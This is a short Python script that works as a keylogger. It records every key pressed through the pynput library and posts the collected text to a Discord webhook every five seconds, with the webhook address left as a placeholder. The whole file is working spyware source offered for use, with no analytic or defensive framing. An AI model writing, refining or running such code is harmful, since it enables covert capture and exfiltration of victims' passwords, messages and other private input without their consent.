import time
import requests
from pynput import keyboard

# Replace with your Discord Webhook URL
DISCORD_WEBHOOK_URL = "YWEBHOOK HERE"

# Storage for keystrokes
keystrokes = []

def send_to_discord(message):
    """Send a message to the Discord webhook."""
    payload = {"content": message}
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

    if response.status_code == 204:
        print("✅ Sent keystrokes to Discord!")
    else:
        print(f"❌ Failed to send! HTTP {response.status_code}")

def analyze_and_send():
    """Send all captured keystrokes every 5 seconds."""
    global keystrokes
    if keystrokes:
        message = "**⌨ Keystrokes:**\n" + "".join(keystrokes)
        send_to_discord(message)
        keystrokes = []  # Clear buffer after sending
    else:
        send_to_discord("✅ Still working...")  # Status update

def on_press(key):
    """Capture and store keystrokes."""
    try:
        if key == keyboard.Key.space:
            keystrokes.append(" ")
        elif key == keyboard.Key.enter:
            keystrokes.append("\n")
        elif key == keyboard.Key.backspace:
            keystrokes.append(" [BACKSPACE] ")
        else:
            keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f" [{key}] ")  # Special keys

# Start the keystroke listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Run periodic sending in a loop
while True:
    analyze_and_send()
    time.sleep(5)  # Send every 5 seconds
